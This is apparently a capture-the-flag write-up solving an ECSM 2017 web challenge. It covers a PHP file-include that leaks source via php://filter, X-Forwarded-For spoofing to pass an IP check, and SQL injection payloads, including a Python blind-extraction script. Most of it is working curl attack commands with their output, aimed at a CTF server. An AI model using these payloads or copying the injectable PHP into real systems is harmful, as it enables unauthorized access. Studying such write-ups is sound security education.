# Challenge 1, Web

## Problem

This task comes from Polish CERT team and was presented as one of five challenges of ECSM 2017 CTF competition. Here is original task description (in Polish):

```
Podwójne uwierzytelnianie Web

Dzięki hiberbolicznej mapie internetu i monitorowaniu ruchu na punktach styku, naszym cyberagentom udało się przechwycić adres zagranicznej strony internetowej, na której cyberszpiedzy jednego z obcych krajów otrzymują instrukcje. Niestety, wygląda na to, że ostatnio zwiększyli swoje cyberzabezpieczenia. Nie znamy także nazwy użytkownika szpiega, którego instrukcje musimy przechwycić, ale wierzymy, że uda Ci się przeprowdzić skuteczny atak cybersnajperski.
```

In general, we have a website with 2FA implemented. This website is used as contact point for foreign spies. Our task is to break into the website and get the flag :)

If you want to try other challenges from this CTF (there are other Web chqallenge, two RE and one Crypto), you can find them here (they were available at the time I post this writeup):

https://ecsm2017.cert.pl

Good luck! :)

Challenges description are available only in Polish, if you want me to help you to understand what's the objective or just ping me on Twitter (@_bl4de) - yes, I speak Polish :) Like many other Polish guys :D


## Solution

When we get into http://ecsm2017.cert.pl:6044/index.php/home, we can see state-of-the-art North Korean website. The content of information is not that important (you can use Google Translate ofc if you are curious):

![screen](web1/screen1.png)

There is only one link, which leads to another page:


![screen](web1/screen2.png)

And that's pretty all. Now we can start to look for any vulnerabiliites, which will allow us to solve the challenge.


### Local File Include

If we take a look at source code of main page, we can spot how links are built (HINT: __always__ look at the source code of any website you're trying to find vulnerabilities. Use web browser's 'Show source code' option, available in every web browser):

```HTML
<nav>
    <a href="/index.php/home">집</a>
    |
    <a href="/index.php/instructions">명령</a>
</nav>
```

When instead of ```home``` or ```instructions``` we put not existing page, we immediately get PHP error that file is not found:

![screen](web1/2.png)

Important thing here is that we put ```abcd``` in address bar, however application tried to load ```abcd.php``` file. That means ```.php``` extension is added by application and we only need to put file name to try include arbitrary file.

Let's try to get source code of ```instructions``` page. We can use ```php://filter```:

```
http://ecsm2017.cert.pl:6044/index.php/php://filter/convert.base64-encode/resource=instructions
```


And here we are, source code encoded with Base64:

![screen](web1/3.png)


Now, we can investigate source code of ```instructions.php``` (after decoding it from Base64):

```PHP
<?php if(!defined('APP')) { die('직접 접근 금지'); }

$ip = $_SERVER['HTTP_CLIENT_IP'] ?: ($_SERVER['HTTP_X_FORWARDED_FOR'] ?: $_SERVER['REMOTE_ADDR']);

function ip_in_range($ip, $min, $max) {
    return (ip2long($min) <= ip2long($ip) && ip2long($ip) <= ip2long($max));
}

if(ip_in_range($ip, '175.45.176.0', '175.45.179.255') ||
   ip_in_range($ip, '210.52.109.0', '210.52.109.255') ||
   ip_in_range($ip, '77.94.35.0', '77.94.35.255')) {

    if (!isset($_SERVER['PHP_AUTH_USER'])) {
        header('HTTP/1.0 401 Unauthorized');
        header('WWW-Authenticate: Basic realm="LOGIN"');
    } else {
        $login = $_SERVER['PHP_AUTH_USER'];
        $password = $_SERVER['PHP_AUTH_PW'];

        $db = new PDO('sqlite:database.sqlite3');

        $result = $db->query("select login, password from users where login = '$login'");
        if (!$result) { die($db->errorInfo()[2]); }
        $data = $result->fetchAll();

        if(count($data) == 0) {
            header('HTTP/1.0 401 Unauthorized');
            header('WWW-Authenticate: Basic realm="NO USER"');
        } elseif (md5($password) !== $data[0]['password']) {
            header('HTTP/1.0 401 Unauthorized');
            header('WWW-Authenticate: Basic realm="WRONG PASSWORD"');
        } else {
            print '<h2>안녕하십니까</h2>';

            $result = $db->query("select message from instructions where login = '{$data[0]['login']}'");
            if (!$result) { die($db->errorInfo()[2]); }
            $data = $result->fetchAll();

            if(count($data) == 0) {
                print('<h3>메시지 없음</h3>');
            } else {
                print '<h3>여기에 당신을위한 메시지가 있습니다.:</h3>';

                foreach($data as $row) {
                    print "<p>- {$row['message']}</p>";
                }
            }
        }
    }
} else {
    ?>
        <p>귀하의 지적 재산권은 영광 된 북한에 속해 있지 않습니다. VPN을 사용하면 사용자 이름과 비밀번호로 로그인 할 수 있습니다.</p>
    <?php
}

?>
```

That looks complicated. We have several steps, where we have to meet conditions like IP used to connect has to be from valid IP ranges, we need to use HTTP Basic authorization (we need to know username and password). Ok, let's get through the code steop by step and see how we can bypass those.


### Abusing IP address verification


First step is to pass IP check from this part of the code:

```php

$ip = $_SERVER['HTTP_CLIENT_IP'] ?: ($_SERVER['HTTP_X_FORWARDED_FOR'] ?: $_SERVER['REMOTE_ADDR']);

function ip_in_range($ip, $min, $max) {
    return (ip2long($min) <= ip2long($ip) && ip2long($ip) <= ip2long($max));
}

if(ip_in_range($ip, '175.45.176.0', '175.45.179.255') ||
   ip_in_range($ip, '210.52.109.0', '210.52.109.255') ||
   ip_in_range($ip, '77.94.35.0', '77.94.35.255')) {

```

Application uses various HTTP request headers to determine an IP address. We can control only one of them: ```$_SERVER['HTTP_X_FORWARDED_FOR']```. So if we set ```HTTP_X_FORWARDED_FOR``` in request headers to IP address which comes from defined ranges, we will pass the first step of verification.

We can use ```curl``` for this:

```
$ curl --verbose --user-agent "hackerone.com/bl4de" --header "X-Forwarded-For: 175.45.176.100" http://ecsm2017.cert.pl:6044/index.php/instructions

*   Trying 136.243.148.95...
* TCP_NODELAY set
* Connected to ecsm2017.cert.pl (136.243.148.95) port 6044 (#0)
> GET /index.php/instructions HTTP/1.1
> Host: ecsm2017.cert.pl:6044
> User-Agent: hackerone.com/bl4de
> Accept: */*
> X-Forwarded-For: 175.45.176.100
>
* HTTP 1.0, assume close after body
< HTTP/1.0 401 Unauthorized
< Date: Thu, 16 Nov 2017 23:10:40 GMT
< Server: Apache
< WWW-Authenticate: Basic realm="LOGIN"
< Content-Length: 244
< Connection: close
< Content-Type: text/html; charset=UTF-8
<
<html>
<head>
<style>
body { background-color: #AA0000; color: white; font-size: 300%;}
</style>
</head>
<body>

<nav>
    <a href="/index.php/home">집</a>
    |
    <a href="/index.php/instructions">명령</a>
</nav>

<hr />


</body>
* Closing connection 0
</html>
```

Let's compare above response with request from IP not belongs to one of ranges:

```
$ curl --verbose --user-agent "hackerone.com/bl4de" http://ecsm2017.cert.pl:6044/index.php/instructions
*   Trying 136.243.148.95...
* TCP_NODELAY set
* Connected to ecsm2017.cert.pl (136.243.148.95) port 6044 (#0)
> GET /index.php/instructions HTTP/1.1
> Host: ecsm2017.cert.pl:6044
> User-Agent: hackerone.com/bl4de
> Accept: */*
>
< HTTP/1.1 200 OK
< Date: Thu, 16 Nov 2017 23:11:59 GMT
< Server: Apache
< Vary: Accept-Encoding
< Content-Length: 430
< Content-Type: text/html; charset=UTF-8
<
<html>
<head>
<style>
body { background-color: #AA0000; color: white; font-size: 300%;}
</style>
</head>
<body>

<nav>
    <a href="/index.php/home">집</a>
    |
    <a href="/index.php/instructions">명령</a>
</nav>

<hr />

        <p>귀하의 지적 재산권은 영광 된 북한에 속해 있지 않습니다. VPN을 사용하면 사용자 이름과 비밀번호로 로그인 할 수 있습니다.</p>

</body>
* Connection #0 to host ecsm2017.cert.pl left intact
</html>
```

Second response gives us ```HTTP/1.1 200 OK```, but the first one ends up with ```HTTP/1.0 401 Unauthorized``` - that means we bypass IP protection and get to the next step.

Next condition checks if HTTP Basic authentication username is set:

```php
if (!isset($_SERVER['PHP_AUTH_USER'])) {
        header('HTTP/1.0 401 Unauthorized');
        header('WWW-Authenticate: Basic realm="LOGIN"');
    } else {
        $login = $_SERVER['PHP_AUTH_USER'];
        $password = $_SERVER['PHP_AUTH_PW'];

        $db = new PDO('sqlite:database.sqlite3');

        $result = $db->query("select login, password from users where login = '$login'");
        if (!$result) { die($db->errorInfo()[2]); }
        $data = $result->fetchAll();

        if(count($data) == 0) {
            header('HTTP/1.0 401 Unauthorized');
            header('WWW-Authenticate: Basic realm="NO USER"');
```

That's pretty easy. Let's use ```curl``` again:

```
$ curl --verbose --user-agent "hackerone.com/bl4de" --header "X-Forwarded-For: 175.45.176.100" --user name:password  http://ecsm2017.cert.pl:6044/index.php/instructions

*   Trying 136.243.148.95...
* TCP_NODELAY set
* Connected to ecsm2017.cert.pl (136.243.148.95) port 6044 (#0)
* Server auth using Basic with user 'name'
> GET /index.php/instructions HTTP/1.1
> Host: ecsm2017.cert.pl:6044
> Authorization: Basic bmFtZTpwYXNzd29yZA==
> User-Agent: hackerone.com/bl4de
> Accept: */*
> X-Forwarded-For: 175.45.176.100
>
* HTTP 1.0, assume close after body
< HTTP/1.0 401 Unauthorized
< Date: Thu, 16 Nov 2017 23:18:28 GMT
< Server: Apache
* Authentication problem. Ignoring this.
< WWW-Authenticate: Basic realm="NO USER"
< Content-Length: 244
< Connection: close
< Content-Type: text/html; charset=UTF-8
<
<html>
<head>
<style>
body { background-color: #AA0000; color: white; font-size: 300%;}
</style>
</head>
<body>

<nav>
    <a href="/index.php/home">집</a>
    |
    <a href="/index.php/instructions">명령</a>
</nav>

<hr />


</body>
* Closing connection 0
</html>
```

Great! This time our response contains ```WWW-Authenticate: Basic realm="NO USER```, which means we've successfuly send username - but, obvioulsy it wasn't found in database, so ```$data``` did not contain any user.


### SQL Injection



Let's take a closer look at this part of code:

```php

        $db = new PDO('sqlite:database.sqlite3');

        $result = $db->query("select login, password from users where login = '$login'");
        if (!$result) { die($db->errorInfo()[2]); }
        $data = $result->fetchAll();
```

So we are dealing with __SQLite__ database and ```SELECT``` query contains obvious ___SQL Injection__ vulnerability - value we pass as ```$login``` is used in SQL query without any sanitization. Let's exploit this flaw, again using ```curl```:

```
$ curl --verbose --user-agent "hackerone.com/bl4de" --header "X-Forwarded-For: 175.45.176.100" --user "name' or '1'='1":password  http://ecsm2017.cert.pl:6044/index.php/instructions

*   Trying 136.243.148.95...
* TCP_NODELAY set
* Connected to ecsm2017.cert.pl (136.243.148.95) port 6044 (#0)
* Server auth using Basic with user 'name' or '1'='1'
> GET /index.php/instructions HTTP/1.1
> Host: ecsm2017.cert.pl:6044
> Authorization: Basic bmFtZScgb3IgJzEnPScxOnBhc3N3b3Jk
> User-Agent: hackerone.com/bl4de
> Accept: */*
> X-Forwarded-For: 175.45.176.100
>
* HTTP 1.0, assume close after body
< HTTP/1.0 401 Unauthorized
< Date: Thu, 16 Nov 2017 23:29:24 GMT
< Server: Apache
* Authentication problem. Ignoring this.
< WWW-Authenticate: Basic realm="WRONG PASSWORD"
< Content-Length: 244
< Connection: close
< Content-Type: text/html; charset=UTF-8
<
<html>
<head>
<style>
body { background-color: #AA0000; color: white; font-size: 300%;}
</style>
</head>
<body>

<nav>
    <a href="/index.php/home">집</a>
    |
    <a href="/index.php/instructions">명령</a>
</nav>

<hr />


</body>
* Closing connection 0
</html>
```

Boom! Classic __1 or 1__ works like a charm and now we get message indicates that ```$data``` contains some result - in HTTP response there is ```WWW-Authenticate: Basic realm="WRONG PASSWORD"``` text which comes from this condition:

```php
    if(count($data) == 0) {
        header('HTTP/1.0 401 Unauthorized');
        header('WWW-Authenticate: Basic realm="NO USER"');
    } elseif (md5($password) !== $data[0]['password']) {
        header('HTTP/1.0 401 Unauthorized');
        header('WWW-Authenticate: Basic realm="WRONG PASSWORD"');
    } else {
        (...)
```

Ok, we are almost home. But now we have quite big problem:

```php
(...)
        } else {
            print '<h2>안녕하십니까</h2>';

            $result = $db->query("select message from instructions where login = '{$data[0]['login']}'");
            if (!$result) { die($db->errorInfo()[2]); }
            $data = $result->fetchAll();

            if(count($data) == 0) {
                print('<h3>메시지 없음</h3>');
            } else {
                print '<h3>여기에 당신을위한 메시지가 있습니다.:</h3>';

                foreach($data as $row) {
                    print "<p>- {$row['message']}</p>";
                }
            }
        }

```

We need to know exact username, because it's used in SQL query getting instructions for spy from database. This requires from us a little bit more advanced exploitation of found SQL Injection flaw. Because we do not get any direct feedback from database, we need to figure out how to extract information we need.

Let's start from analyzing what we need to bypass this last condition:

- we need to know at least one valid username
- we need to bypass this condition:

```php
 } elseif (md5($password) !== $data[0]['password']) {
```


Seems difficult, but... We can control value passed as ```password```. So, we can provide both ```password``` and its valid MD5 hash - and this condition will be always satisfied!

Let's try to do this:


```
$ curl --verbose --user-agent "hackerone.com/bl4de" --header "X-Forwarded-For: 175.45.176.100" --user "name' or '1'='2' UNION SELECT 'anyone','5f4dcc3b5aa765d61d8327deb882cf99'--":password  http://ecsm2017.cert.pl:6044/index.php/instructions

*   Trying 136.243.148.95...
* TCP_NODELAY set
* Connected to ecsm2017.cert.pl (136.243.148.95) port 6044 (#0)
* Server auth using Basic with user 'name' or '1'='2' UNION SELECT 'anyone','5f4dcc3b5aa765d61d8327deb882cf99'--'
> GET /index.php/instructions HTTP/1.1
> Host: ecsm2017.cert.pl:6044
> Authorization: Basic bmFtZScgb3IgJzEnPScyJyBVTklPTiBTRUxFQ1QgJ2FueW9uZScsJzVmNGRjYzNiNWFhNzY1ZDYxZDgzMjdkZWI4ODJjZjk5Jy0tOnBhc3N3b3Jk
> User-Agent: hackerone.com/bl4de
> Accept: */*
> X-Forwarded-For: 175.45.176.100
>
< HTTP/1.1 200 OK
< Date: Thu, 16 Nov 2017 23:37:34 GMT
< Server: Apache
< Vary: Accept-Encoding
< Content-Length: 296
< Content-Type: text/html; charset=UTF-8
<
<html>
<head>
<style>
body { background-color: #AA0000; color: white; font-size: 300%;}
</style>
</head>
<body>

<nav>
    <a href="/index.php/home">집</a>
    |
    <a href="/index.php/instructions">명령</a>
</nav>

<hr />

<h2>안녕하십니까</h2><h3>메시지 없음</h3>
</body>
* Connection #0 to host ecsm2017.cert.pl left intact
</html>

```

And we're in! See ```<h2>안녕하십니까</h2><h3>메시지 없음</h3>``` in response body? This is HTML fragment which we can get only when in this fragment ```count($data)``` returns something:

```php
    if(count($data) == 0) {
        print('<h3>메시지 없음</h3>');
    } else {
        print '<h3>여기에 당신을위한 메시지가 있습니다.:</h3>';

        foreach($data as $row) {
            print "<p>- {$row['message']}</p>";
        }
    }
```


Ok, that SQL Injection payload might look complicated, let's take a look at it little bit closer:
First, full ```curl`` command:


```
$ curl --verbose --user-agent "hackerone.com/bl4de" --header "X-Forwarded-For: 175.45.176.100" --user "name' or '1'='2' UNION SELECT 'anyone','5f4dcc3b5aa765d61d8327deb882cf99'--":password  http://ecsm2017.cert.pl:6044/index.php/instructions
```

Now, SQLi payload:

```
--user "name' or '1'='2' UNION SELECT 'anyone','5f4dcc3b5aa765d61d8327deb882cf99'--":password
```

Ok, so first we pass always false condition to not allow database returns existing username, even if we correctly guess one, because we do not know password. Then, using ```UNION``` clause, we inject our own fake username, together with MD5 hash of password which we know as well, because we are passing it as well (payload above is injectet into ```curl``` --user username:password syntax, which allows to send credentials for HTTP Basic authorization).

Now, let's see how SQL query in PHP code will look like. First, original query:

```php
$result = $db->query("select message from instructions where login = '{$data[0]['login']}'");
```

And with our payload, which will be put as ```{$data[0]['login']}```:

```php
$result = $db->query("select message from instructions where login = 'name' or '1'='2' UNION SELECT 'anyone','5f4dcc3b5aa765d61d8327deb882cf99'--'");
```

This query will return result contains username and password, which satisfy all conditions and finally we will land here:

```php
    foreach($data as $row) {
        print "<p>- {$row['message']}</p>";
    }

```

Ok, so ```{$row['message']}``` contains final solution. But it's empty. And it's empty, because even if we successfuly expolited all vulnerabilities, we still need __existing__ username, because only then we get real results from this fragment:

```php
$result = $db->query("select message from instructions where login = '{$data[0]['login']}'");
if (!$result) { die($db->errorInfo()[2]); }
$data = $result->fetchAll();
```

"But we already get $data from this query, did't we?@ you might ask.

Yes, you're correct, but as we pass fake username and password, ```message``` column contains NULL. It will contain legitimate data only for username, which exists in database.

So let's use SQL Injection we've found and let's try to extract some username. Problem is that we do not get any readable feedback from backend, so any ```UNION``` based injections won't work as we expect. Good news is we can still use ```UNION```, however we need to extract data character by character, using comparision between valid and invalid response from the server.

First, let's see how correct request looks like. I've used ```admin``` here as example, but actually, I guessed existing username and I get response which means ```admin``` user was found in database:


```
$ curl --verbose --user-agent "hackerone.com/bl4de" --header "X-Forwarded-For: 175.45.176.100" --user "name' or '1'='2' UNION SELECT 'user', CASE WHEN (SELECT login FROM users LIMIT 1)='admin' THEN '5f4dcc3b5aa765d61d8327deb882cf99' ELSE '' END--":password  http://ecsm2017.cert.pl:6044/index.php/instructions

*   Trying 136.243.148.95...
* TCP_NODELAY set
* Connected to ecsm2017.cert.pl (136.243.148.95) port 6044 (#0)
* Server auth using Basic with user 'name' or '1'='2' UNION SELECT 'user', CASE WHEN (SELECT login FROM users LIMIT 1)='admin' THEN '5f4dcc3b5aa765d61d8327deb882cf99' ELSE '' END--'
> GET /index.php/instructions HTTP/1.1
> Host: ecsm2017.cert.pl:6044
> Authorization: Basic bmFtZScgb3IgJzEnPScyJyBVTklPTiBTRUxFQ1QgJ3VzZXInLCBDQVNFIFdIRU4gKFNFTEVDVCBsb2dpbiBGUk9NIHVzZXJzIExJTUlUIDEpPSdhZG1pbicgVEhFTiAnNWY0ZGNjM2I1YWE3NjVkNjFkODMyN2RlYjg4MmNmOTknIEVMU0UgJycgRU5ELS06cGFzc3dvcmQ=
> User-Agent: hackerone.com/bl4de
> Accept: */*
> X-Forwarded-For: 175.45.176.100
>
< HTTP/1.1 200 OK
< Date: Thu, 16 Nov 2017 23:57:40 GMT
< Server: Apache
< Vary: Accept-Encoding
< Content-Length: 296
< Content-Type: text/html; charset=UTF-8
<
<html>
<head>
<style>
body { background-color: #AA0000; color: white; font-size: 300%;}
</style>
</head>
<body>

<nav>
    <a href="/index.php/home">집</a>
    |
    <a href="/index.php/instructions">명령</a>
</nav>

<hr />

<h2>안녕하십니까</h2><h3>메시지 없음</h3>
</body>
* Connection #0 to host ecsm2017.cert.pl left intact
</html>
```

__SPOILER__: no, ```admin``` user does not have any message saved in database.


Now, let's try some not existing username:

```
$ curl --verbose --user-agent "hackerone.com/bl4de" --header "X-Forwarded-For: 175.45.176.100" --user "name' or '1'='2' UNION SELECT 'user', CASE WHEN (SELECT login FROM users LIMIT 1)='Korg' THEN '5f4dcc3b5aa765d61d8327deb882cf99' ELSE '' END--":password  http://ecsm2017.cert.pl:6044/index.php/instructions
*   Trying 136.243.148.95...
* TCP_NODELAY set
* Connected to ecsm2017.cert.pl (136.243.148.95) port 6044 (#0)
* Server auth using Basic with user 'name' or '1'='2' UNION SELECT 'user', CASE WHEN (SELECT login FROM users LIMIT 1)='Korg' THEN '5f4dcc3b5aa765d61d8327deb882cf99' ELSE '' END--'
> GET /index.php/instructions HTTP/1.1
> Host: ecsm2017.cert.pl:6044
> Authorization: Basic bmFtZScgb3IgJzEnPScyJyBVTklPTiBTRUxFQ1QgJ3VzZXInLCBDQVNFIFdIRU4gKFNFTEVDVCBsb2dpbiBGUk9NIHVzZXJzIExJTUlUIDEpPSdLb3JnJyBUSEVOICc1ZjRkY2MzYjVhYTc2NWQ2MWQ4MzI3ZGViODgyY2Y5OScgRUxTRSAnJyBFTkQtLTpwYXNzd29yZA==
> User-Agent: hackerone.com/bl4de
> Accept: */*
> X-Forwarded-For: 175.45.176.100
>
* HTTP 1.0, assume close after body
< HTTP/1.0 401 Unauthorized
< Date: Fri, 17 Nov 2017 00:00:49 GMT
< Server: Apache
* Authentication problem. Ignoring this.
< WWW-Authenticate: Basic realm="WRONG PASSWORD"
< Content-Length: 244
< Connection: close
< Content-Type: text/html; charset=UTF-8
<
<html>
<head>
<style>
body { background-color: #AA0000; color: white; font-size: 300%;}
</style>
</head>
<body>

<nav>
    <a href="/index.php/home">집</a>
    |
    <a href="/index.php/instructions">명령</a>
</nav>

<hr />


</body>
* Closing connection 0
</html>
```

This time we get ```HTTP/1.0 401 Unauthorized``` response, so our injected query is false.

Ok, now when we know how to distinct between valid and invalid queries, let's start username extraction. To do this, I've prepared simple Python expolit, which iterates over character set:

```Python
#!/usr/bin/env python
import requests


query = "name' or '1'='2' UNION SELECT 'user', CASE WHEN (SELECT substr(login, {},1) FROM users LIMIT 1,1)='{}' THEN '5f4dcc3b5aa765d61d8327deb882cf99' ELSE '' END--"

url = 'http://ecsm2017.cert.pl:6044/index.php/instructions'

headers = {
    "User-Agent": "hackerone.com/bl4de",
    "X-Forwarded-For": "175.45.176.100"
}

login = ''
for rep in range(1, 30):
    for c in 'abcdefghijklmnopqrstuwvxyzABCDEFGHNIJKLMNOPQRSTUWVXYZ1234567890-_[]()$#%&*!+=-;<>?/':
        auth = (
            query.format(rep, c), 'password'
        )
        resp = requests.get(url, auth=auth, headers=headers)
        if '</h2><h3>' in resp.content:
            login = login + c
            print '[+] found username: {}'.format(login)
            continue

print '[+] finished!!!'

```


Although script is rather self-explanatory, here is fragment of its ouptut during username extraction process:

```
$ ./sqli.py
[+] found username: V
[+] found username: Ve
[+] found username: VeR
[+] found username: VeRy
[+] found username: VeRyS
[+] found username: VeRySe
[+] found username: VeRySeC
[+] found username: VeRySeCr
(...)
```

It takes some time for this script to finish, but when it's finally done, we have username we need to finally solve the challenge: ```VeRySeCr3tAgent```.


### Final request

Now we can use found username in our ```UNION``` SQL payload - because we still do not know the password, only username (we could extract password in the same way we get username, but it's not necessary).

One last ```curl``` command gives us message we're looking for:

```
$ curl --verbose --user-agent "hackerone.com/bl4de" --header "X-Forwarded-For: 175.45.176.100" --user "name' or '1'='2' UNION SELECT 'VeRySeCr3tAgent','5f4dcc3b5aa765d61d8327deb882cf99'--":password  http://ecsm2017.cert.pl:6044/index.php/instructions
```

And here we are: 

![screen](web1/6.png)


The flag: __ecsm{cyber.szpiegostwo}__ (Eng: 'cyber.spying')


## Summary

That was very interesting challenge, contains many security vulnerabilities and, probably, more than one path to get to the final solution. If you solved this challeng in other way - let me know how did you do this :)

I hope you have learnt something new reading my writeup (if you were not already familiar with techniques presented here). As always - any feedback warm welcome, just ping me on Twitter at https://twitter.com/_bl4de

Stay Safe!

bl4de
